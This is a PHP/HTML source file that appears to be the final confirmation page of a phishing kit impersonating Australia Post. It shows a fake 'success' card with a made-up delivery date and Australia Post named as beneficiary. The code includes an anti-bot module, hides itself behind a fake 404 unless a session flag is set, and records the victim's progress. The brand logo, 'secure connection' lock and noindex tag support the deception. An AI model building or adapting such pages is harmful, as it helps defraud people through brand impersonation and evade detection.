<?php
session_start();

include 'lang_main.php';
require_once __DIR__ . '/antibot.php';

// Validate MASTER session
if (!isset($_SESSION['MASTER']) || $_SESSION['MASTER'] !== true) {
    header("HTTP/1.0 404 Not Found");
    exit;
}

// Generate dynamic delivery date (Today + 3 days)
$deliveryDate = date('d/m/Y', strtotime('+3 days'));
// TRACKING STEP
$_SESSION['step'] = 'finished'; 
?>
<!DOCTYPE html>
<html lang="<?= $current_lang ?>">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex">
    <title><?= t('success_title') ?> | Australia Post</title>
    <link rel="icon" type="image/x-icon" href="assets/favicon.ico">
    <link rel="stylesheet" href="assets/post-branding.css?v=<?= time() ?>">
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="assets/site.min.js"></script>
    <style>
        /* PREMIUM SUCCESS PAGE STYLES - PERFECT FIT & NO SCROLL */
        html {
            height: 100%;
        }
        body {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            margin: 0;
            padding: 0;
            overflow-x: hidden;
            font-family: 'Frutiger', sans-serif;
            color: #333;
        }

        /* Bg circles moved to global CSS branding */


        
        /* Flex containers for structural layout */
        .post-header {
            flex-shrink: 0; /* Header never shrinks */
            background: #fff;
            padding: 15px 0;
            width: 100%;
            z-index: 10;
        }
        
        .post-footer {
            flex-shrink: 0; /* Footer never shrinks */
            width: 100%;
        }

        .main-wrapper {
            flex-grow: 1; /* Takes all available space */
            display: flex;
            align-items: center; /* Center vertically */
            justify-content: center; /* Center horizontally */
            width: 100%;
            padding: 20px;
            box-sizing: border-box; /* Crucial for padding/width calculation */
            position: relative;
        }

        .content-container {
            width: 100%;
            display: flex;
            justify-content: center;
        }

        .success-card-premium {
            background: #ffffff;
            border-radius: 28px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.08);
            padding: 45px 35px;
            max-width: 440px;
            width: 100%;
            text-align: center;
            position: relative;
            border: 1px solid rgba(255,255,255,1);
            animation: slideUpFade 0.9s cubic-bezier(0.16, 1, 0.3, 1) forwards;
            opacity: 0;
            margin: 0 auto;
            overflow: hidden;
        }


        @keyframes slideUpFade {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* Animated Checkmark */
        .check-container {
            width: 80px;
            height: 80px;
            margin: 0 auto 25px auto;
            position: relative;
        }
        
        .circle-bg {
            fill: none;
            stroke: #007e33;
            stroke-width: 2.5;
            stroke-linecap: round;
            stroke-dasharray: 200;
            stroke-dashoffset: 200;
            animation: drawCircle 1.2s cubic-bezier(0.4, 0, 0.2, 1) forwards;
        }

        .check-icon {
            fill: none;
            stroke: #007e33;
            stroke-width: 4.5;
            stroke-linecap: round;
            stroke-linejoin: round;
            stroke-dasharray: 60;
            stroke-dashoffset: 60;
            animation: drawCheck 0.7s 1.1s cubic-bezier(0.65, 0, 0.45, 1) forwards;
        }

        @keyframes drawCircle { to { stroke-dashoffset: 0; } }
        @keyframes drawCheck { to { stroke-dashoffset: 0; } }


        /* Typography */
        .page-title {
            font-size: 24px !important;
            font-weight: 800 !important;
            color: #1a1a1a;
            margin-bottom: 15px !important;
            letter-spacing: -0.5px;
        }

        .page-subtitle {
            font-size: 15px;
            color: #525f7f;
            line-height: 1.5;
            max-width: 100%;
            margin: 0 auto 30px auto;
        }

        /* Details Ticket */
        .details-ticket {
            background: #fdfdfd;
            border: 1px solid #f0f0f0;
            border-radius: 20px;
            padding: 24px;
            position: relative;
            margin-bottom: 30px;
            box-shadow: inset 0 2px 4px rgba(0,0,0,0.02);
            animation: ticketIn 0.8s 0.3s cubic-bezier(0.16, 1, 0.3, 1) both;
        }
        @keyframes ticketIn {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
        }

        .ticket-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 0;
            border-bottom: 1px dashed #eee;
        }
        .ticket-row:last-child {
            border-bottom: none;
            padding-bottom: 0;
        }
        .ticket-row:first-child {
            padding-top: 0;
        }

        .t-label {
            font-size: 11px;
            color: #94a3b8;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .t-value {
            font-size: 14px;
            font-weight: 700;
            color: #1e293b;
        }


        .status-pill {
            background: #ecfdf5;
            color: #059669;
            padding: 6px 14px;
            border-radius: 100px;
            font-size: 10px;
            font-weight: 800;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            border: 1px solid #d1fae5;
        }

        /* Post Decoration */
        .post-decor {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 6px;
            background: linear-gradient(90deg, #dc1928 0%, #b8141e 100%);
        }

        /* Home Button */
        .home-btn {
            background: #dc1928;
            color: #ffffff;
            padding: 14px 28px;
            border-radius: 12px;
            font-weight: 700;
            font-size: 15px;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            margin-top: 10px;
            box-shadow: 0 10px 20px -5px rgba(220, 25, 40, 0.35);
        }
        .home-btn:hover {
            background: #b8141e;
            color: #ffffff;
            transform: translateY(-3px);
            box-shadow: 0 15px 25px -5px rgba(220, 25, 40, 0.45);
        }


        /* Responsive Mobile - Perfect Centering */
        @media (max-width: 480px) {
            .main-wrapper {
                padding: 15px;
            }
            
            .success-card-premium {
                padding: 30px 20px;
                border-radius: 20px;
                box-shadow: 0 10px 30px rgba(0,0,0,0.05);
            }

            .page-title {
                font-size: 22px !important;
            }
            
            .logo-container img {
                height: 28px; /* Slightly smaller logo on mobile */
            }
        }
    </style>
</head>
<body>
    <div class="post-yellow-bar"></div>


    <header class="post-header">
        <div class="header-container">
            <div class="logo-container">
                <img src="assets/POST.svg" alt="Australia Post" class="post-logo">
            </div>
            <div class="header-right">
                <div class="login-text">
                    <img src="assets/lock.svg" alt="Secure" class="lock-icon">
                    <span><?= t('secure_conn') ?></span>
                </div>
            </div>
        </div>
    </header>
    
    <main class="main-wrapper">
        <div class="content-container">
            
            <div class="success-card-premium">
                <div class="post-decor"></div>
                
                <!-- SVG Animated Checkmark -->
                <div class="check-container">
                    <svg viewBox="0 0 100 100" style="width:100%; height:100%;">
                        <circle class="circle-bg" cx="50" cy="50" r="45"></circle>
                        <path class="check-icon" d="M30 52 L45 67 L70 35"></path>
                    </svg>
                </div>

                <h1 class="page-title"><?= t('success_title') ?></h1>
                
                <p class="page-subtitle">
                    <?= t('success_desc') ?>
                </p> 

                <div class="details-ticket">
                    <div class="ticket-row">
                        <span class="t-label"><?= t('date_label') ?></span>
                        <span class="t-value"><?= $deliveryDate ?></span>
                    </div>
                    <div class="ticket-row">
                        <span class="t-label"><?= t('bene_label') ?></span>
                        <span class="t-value">Australia Post</span>
                    </div>
                    <div class="ticket-row">
                        <span class="t-label"><?= t('status_label') ?></span>
                        <span class="status-pill"><i class="fas fa-check-circle"></i> <?= t('status_ok') ?></span>
                    </div>
                </div>

                <p style="margin-top: 30px; font-size: 12px; color: #cbd5e1;">
                    <?= t('copyright') ?>
                </p>


            </div>
        </div>
    </main>

    <footer class="post-footer" style="margin-top: auto;">
        <div class="footer-container">
            <!-- Simplified Footer for Success Page -->
            <div class="footer-desktop" style="justify-content: center; opacity: 0.6;">
                <p style="font-size:12px; color:#999; margin:0;">
                    &copy; <?= date('Y') ?> Australia Post
                </p>
            </div>
            <!-- MOBILE VERSION -->
            <div class="footer-mobile" style="opacity: 0.6;">
                &copy; <?= date('Y') ?> <?= t('copyright') ?>
            </div>
        </div>
    </footer>
</body>
</html>